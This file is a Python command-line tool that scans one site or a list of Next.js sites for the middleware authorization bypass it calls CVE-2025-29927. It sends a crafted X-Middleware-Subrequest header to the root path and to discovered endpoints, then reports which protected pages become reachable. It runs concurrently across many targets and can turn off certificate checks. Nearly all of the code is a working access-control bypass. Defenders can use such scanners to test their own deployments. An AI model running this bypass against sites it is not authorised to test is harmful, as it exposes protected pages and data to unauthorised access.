import requests
import re
import argparse
import concurrent.futures
from urllib.parse import urljoin
from colorama import Fore, Style, init
from urllib3.exceptions import InsecureRequestWarning
init(autoreset=True) 

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

banner = """

 ███▄    █ ▓█████ ▒██   ██▒▄▄▄█████▓ ██ ▄█▀
 ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░▓  ██▒ ▓▒ ██▄█▒ 
▓██  ▀█ ██▒▒███   ░░  █   ░▒ ▓██░ ▒░▓███▄░ 
▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ░ ▓██▓ ░ ▓██ █▄ 
▒██░   ▓██░░▒████▒▒██▒ ▒██▒  ▒██▒ ░ ▒██▒ █▄
░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░  ▒ ░░   ▒ ▒▒ ▓▒
░ ░░   ░ ▒░ ░ ░  ░░░   ░▒ ░    ░    ░ ░▒ ▒░
   ░   ░ ░    ░    ░    ░    ░      ░ ░░ ░ 
         ░    ░  ░ ░    ░           ░  ░ 
                            by c0d3Ninja
"""

def check_nextjs_vulnerability(target, verify_ssl=True, silent=False, custom_header=None):
    try:
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        if not silent:
            print(f"{Fore.BLUE}[*] Scanning {target}...")
            
        headers = {'X-Nextjs-Data': '1'}
        resp1 = requests.get(target, headers=headers, timeout=10, allow_redirects=False, verify=verify_ssl)
        
        nextjs_headers = ['x-nextjs-redirect', 'x-middleware-rewrite', 'x-nextjs-rewrite']
        has_middleware = any(header.lower() in resp1.headers for header in nextjs_headers)
        
        if not has_middleware or resp1.status_code != 307:
            pass
            return
        
        redirect_path = None
        for header in resp1.headers:
            if header.lower() in nextjs_headers:
                redirect_path = resp1.headers[header]
                break
        
        # Use custom header if provided, otherwise use default one
        exploit_header = custom_header or "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"
        
        if not silent and custom_header:
            print(f"{Fore.YELLOW}[!] Using custom header: {custom_header}")
        
        headers = {
            'X-Nextjs-Data': '1',
            'X-Middleware-Subrequest': exploit_header
        }
        
        resp2 = requests.get(target, headers=headers, timeout=10, verify=verify_ssl)
        
        if resp2.status_code == 200 and not silent:
            print(f"{Fore.RED}[!] {target} might be vulnerable to middleware bypass on root path")
        
        resp3 = requests.get(target, timeout=10, verify=verify_ssl)
        endpoints = re.findall(r'href=[\'"](\\/[^\\.\"\']+)[\'"]', resp3.text)
        
        if not endpoints:
            endpoints = re.findall(r'href=[\'"](\/[^\\.\"\']+)[\'"]', resp3.text)  # Try without escape
        
        unique_endpoints = list(set(endpoints))
        
        for endpoint in unique_endpoints:
            endpoint = endpoint.replace(r'\/', '/')
            endpoint_url = urljoin(target, endpoint)
            
            resp4 = requests.get(endpoint_url, timeout=10, allow_redirects=False, verify=verify_ssl)
            
            middleware_active = False
            for header in ['x-middleware-rewrite', 'x-middleware-next', 'x-middleware-redirect']:
                if header in map(str.lower, resp4.headers):
                    middleware_active = True
                    break
            
            if 'location' in resp4.headers and 'unauthorized' in resp4.headers['location'].lower():
                middleware_active = True
            
            if middleware_active and resp4.status_code != 200:
                headers = {'X-Middleware-Subrequest': exploit_header}
                resp5 = requests.get(endpoint_url, headers=headers, timeout=10, verify=verify_ssl)
                
                if resp5.status_code == 200:
                    print(f"{Fore.RED}[VULNERABLE] {target} - Endpoint {endpoint} can be bypassed")
                    print(f"  {Fore.GREEN}Original status: {resp4.status_code}")
                    print(f"  {Fore.GREEN}Bypassed status: {resp5.status_code}")
                    print(f"  {Fore.YELLOW}Bypass header: X-Middleware-Subrequest: {exploit_header}")
                    return True
        
        if not silent:
            print(f"{Fore.GREEN}[✓] {target} appears not vulnerable")
        return False
        
    except requests.exceptions.RequestException as e:
        if not silent:
            pass
    except Exception as e:
        if not silent:
            pass
    
    return False

def main():
    parser = argparse.ArgumentParser(description="Next.js Middleware Bypass Scanner (CVE-2025-29927)")
    parser.add_argument("-t", "--target", help="Single target to scan")
    parser.add_argument("-f", "--file", help="File containing list of targets")
    parser.add_argument("-c", "--concurrency", type=int, default=5, help="Number of concurrent scans")
    parser.add_argument("-k", "--insecure", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("-s", "--silent", action="store_true", help="Silent mode - only show vulnerable targets")
    parser.add_argument("-H", "--header", help="Custom header value for X-Middleware-Subrequest (e.g. \"middleware:middleware:middleware:middleware:middleware\")")
    args = parser.parse_args()
    
    targets = []
    
    if args.target:
        targets.append(args.target)
    
    if args.file:
        with open(args.file, 'r') as f:
            targets.extend([line.strip() for line in f if line.strip()])
    
    if not targets:
        parser.print_help()
        return
    
    if not args.silent:
        print(f"{Fore.CYAN}[*] Starting scan for Next.js Middleware Bypass (CVE-2025-29927)")
        print(f"{Fore.CYAN}[*] Targets: {len(targets)}")
        if args.insecure:
            print(f"{Fore.YELLOW}[!] SSL certificate verification disabled")
        if args.header:
            print(f"{Fore.YELLOW}[!] Using custom header: {args.header}")
    
    vulnerable_targets = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as executor:
        future_to_target = {executor.submit(check_nextjs_vulnerability, target, not args.insecure, args.silent, args.header): target for target in targets}
        
        for future in concurrent.futures.as_completed(future_to_target):
            target = future_to_target[future]
            try:
                is_vulnerable = future.result()
                if is_vulnerable:
                    vulnerable_targets.append(target)
            except Exception as e:
                if not args.silent:
                    print(f"{Fore.RED}[!] Error processing {target}: {e}")
    
    if not args.silent:
        print(f"\n{Fore.CYAN}[*] Scan complete!")
    if vulnerable_targets:
        if not args.silent:
            print(f"{Fore.RED}[!] Vulnerable targets: {len(vulnerable_targets)}")
        for target in vulnerable_targets:
            print(f"{Fore.RED}    - {target}")
    elif not args.silent:
        print(f"{Fore.GREEN}[✓] No vulnerable targets found.")

if __name__ == "__main__":
    print(banner)
    main()
